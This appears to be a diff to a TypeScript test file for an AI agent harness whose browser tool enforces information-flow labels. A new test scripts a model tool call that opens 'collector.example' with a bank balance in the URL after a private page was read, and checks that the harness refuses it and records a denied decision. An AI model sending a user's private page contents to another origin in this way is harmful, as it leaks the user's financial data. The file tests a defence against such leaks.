@@ -7,6 +7,8 @@ import type {
   BrowserHostResult,
   HarnessBrowserHost,
 } from "../src/contracts/browser-host.ts";
+import { browserOwnerViewClause } from "../src/browser-release.ts";
+import { createToolOutputId } from "../src/contracts/tool-result.ts";
 import { CfHarnessEngine } from "../src/engine.ts";
 import { CFC_ATOM_TYPE, CFC_CONCEPT_KIND } from "@commonfabric/api/cfc";
 import { createCliPromptSlotBinding } from "../src/contracts/prompt-slot.ts";
@@ -158,9 +160,11 @@ describe("prompt-loop with a browser host", () => {
     expect(child.tools).toEqual(["browser"]);
     expect(childSystem).toContain("shown to the owner as you work");
     expect(childSystem).not.toContain("Browser Access lease");
-    expect(host.operations).toEqual([
-      { action: "open", url: "https://shop.example/" },
-    ]);
+    expect(host.operations).toEqual([{
+      action: "open",
+      url: "https://shop.example/",
+      decision: { sequence: 1, sink: "browser.open", covers: "public-web" },
+    }]);
     expect(delegated.subagent.structuredReturn.value.url).toMatch(/^cfh:v:/);
     expect(JSON.stringify(result.transcript)).not.toContain(
       "https://shop.example/item/7",
@@ -340,6 +344,7 @@ describe("prompt-loop with a browser host", () => {
         text: "https://shop.example/item/7",
         description: "a value an agent found",
       },
+      decision: { sequence: 1, sink: "browser.open", covers: "public-web" },
     }]);
   });
 
@@ -509,5 +514,72 @@ describe("prompt-loop with a browser host", () => {
       "handoff",
       "handoff",
     ]);
+  });
+
+  it("under CFC enforcement, refuses sending what a private page showed to another origin, and records the refusal as a policy decision", async () => {
+    const host = new RecordingBrowserHost();
+    const engine = new CfHarnessEngine({
+      sandboxRuntime: new FakeSandboxRuntime(),
+      runId: "run-browser-host-release",
+      model: "gpt-5.4",
+      cfcEnforcementMode: "enforce-strict",
+      browserHost: host,
+    });
+    await engine.recordCfcModelContextObservations([{
+      toolCallId: "call-private-read",
+      toolId: "browser",
+      outputId: createToolOutputId("run-browser-host-release", "browser", 0),
+      channels: ["output"],
+      label: {
+        confidentiality: [
+          browserOwnerViewClause("did:key:z6MkOwner", "https://bank.example"),
+        ],
+      },
+    }]);
+    const loop = new CfHarnessPromptLoop({
+      apiKey: "test-key",
+      engine,
+      allowedToolIds: ["browser"],
+      fetchFn: scriptedFetch([
+        toolCallTurn("call-leak", "browser", {
+          action: "open",
+          url: "https://collector.example/?balance=1234",
+        }),
+        finalTurn("Done."),
+      ], []),
+    });
+
+    const result = await loop.runPrompt({
+      prompt: "Check my balance.",
+      promptSlotBinding: createCliPromptSlotBinding({
+        kernelName: "cf-harness",
+        subject: "browser-host-release",
+      }),
+    });
+
+    const [output] = result.transcript
+      .filter((message) => message.role === "tool")
+      .map((message) => JSON.parse(message.content));
+    expect(output).toMatchObject({
+      status: "error",
+      code: "release_refused",
+    });
+    expect(output).not.toHaveProperty("releaseDecision");
+    expect(host.operations).toEqual([]);
+    expect(
+      result.runState.policyDecisions?.find((decision) =>
+        decision.release !== undefined
+      ),
+    ).toMatchObject({
+      toolId: "browser",
+      decision: "denied",
+      reasonCodes: ["cfc_release_refused"],
+      release: {
+        reasonCode: "cfc_release_refused",
+        boundary: "release",
+        sink: "browser.open",
+        audience: "https://collector.example",
+      },
+    });
   });
 });
